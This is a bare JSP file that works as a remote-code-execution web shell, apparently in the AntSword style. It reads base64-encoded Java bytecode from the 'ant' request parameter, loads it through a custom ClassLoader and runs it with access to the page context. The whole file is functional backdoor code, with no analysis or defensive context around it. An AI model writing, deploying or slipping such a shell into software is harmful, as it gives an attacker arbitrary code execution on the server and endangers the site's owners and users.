<%@ page import="sun.misc.BASE64Decoder" %>
<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
    BASE64Decoder decoder=new sun.misc.BASE64Decoder();
%>
<%
    String cls=request.getParameter("ant");
    if(cls!=null){
    new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext);
    }
%>
